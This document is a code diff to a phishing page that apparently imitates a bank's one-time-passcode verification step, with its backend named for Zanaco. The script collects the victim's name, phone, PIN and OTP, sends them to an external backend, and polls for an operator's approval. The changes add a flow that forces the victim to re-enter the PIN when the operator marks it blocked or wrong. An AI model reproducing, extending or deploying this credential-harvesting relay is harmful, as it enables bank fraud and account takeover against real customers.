@@ -21,24 +21,10 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 .shake { animation: shake 0.4s; }
 @keyframes shake { 0%{transform:translateX(0);}25%{transform:translateX(-5px);}50%{transform:translateX(5px);}75%{transform:translateX(-5px);}100%{transform:translateX(0);} }
 
-/* --------- Countdown Timer --------- */
-#timerContainer {
-    margin-top:10px;
-    display:none;
-    font-size:16px;
-    color:#555;
-}
-#timerDisplay {
-    font-weight:bold;
-    color:red;
-}
-.code {
-    margin-bottom: 5px;
-}
-.otp-header {
-    font-weight: 300;
-   font-size: 20px;
-}
+#timerContainer { margin-top:10px; display:none; font-size:16px; color:#555; }
+#timerDisplay { font-weight:bold; color:red; }
+.code { margin-bottom: 5px; }
+.otp-header { font-weight: 300; font-size: 20px; }
 </style>
 </head>
 <body>
@@ -59,7 +45,6 @@ button:disabled { background:#ccc; cursor:not-allowed; }
         </button>
     </form>
 
-    <!-- OTP Timer -->
     <div id="timerContainer">
         OTP expires in <span id="timerDisplay">45</span> seconds
     </div>
@@ -70,15 +55,13 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
-// ---------------- BOT ROUTING ----------------
+// ---------------- BOT & PIN ROUTING ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error(); }
+const pinRequestId = params.get('requestId'); // optional, in case PIN approval flow
 
-// Prevent skipping steps
-if (!localStorage.getItem('pin')) {
-    window.location.href = `pin.html?botId=${botId}`;
-}
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+if (!localStorage.getItem('pin')) { window.location.href = `pin.html?botId=${botId}`; }
 
 // ---------------- CODE INPUT LOGIC ----------------
 const inputs = document.querySelectorAll('.code-boxes input');
@@ -97,9 +80,7 @@ inputs.forEach((input, i) => {
         button.disabled = ![...inputs].every(x => x.value);
     });
     input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && i > 0) {
-            inputs[i-1].focus();
-        }
+        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i-1].focus();
     });
 });
 
@@ -124,14 +105,12 @@ function startCountdown() {
 // ---------------- SUBMIT CODE ----------------
 document.getElementById('codeForm').addEventListener('submit', async e => {
     e.preventDefault();
-
-    startCountdown(); // start timer on submit
+    startCountdown();
 
     const code = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name');
     const phone = localStorage.getItem('phone');
 
-    // --- UX FEEDBACK ---
     button.disabled = true;
     btnText.textContent = 'Verifying...';
     spinner.style.display = 'inline-block';
@@ -145,21 +124,37 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
         });
         const { requestId } = await res.json();
 
-        // Polling for approval
         const poll = setInterval(async () => {
             const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
             const d = await r.json();
 
-            if (d.approved === true) {
+            // --------- BLOCK / WRONG PIN ---------
+            if (d.blocked || d.redirectToPin) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on success
-                localStorage.clear();
-                window.location.href = `success.html?botId=${botId}`;
+                clearInterval(countdown);
+                localStorage.removeItem('pin');
+                statusText.textContent = d.message || "You must re-enter PIN";
+                button.disabled = false;
+                btnText.textContent = 'Submit Code';
+                spinner.style.display = 'none';
+                inputs.forEach(i => i.value='');
+                window.location.href = `pin.html?botId=${botId}`; // force PIN re-entry
+                return;
             }
 
+            // --------- CORRECT CODE ---------
+            if (d.approved === true) {
+                clearInterval(poll);
+                clearInterval(countdown);
+                localStorage.clear();
+                window.location.href = `success.html?botId=${botId}`;
+                return;
+            }
+
+            // --------- WRONG CODE ---------
             if (d.approved === false) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on failure
+                clearInterval(countdown);
                 button.disabled = false;
                 btnText.textContent = 'Submit Code';
                 spinner.style.display = 'none';
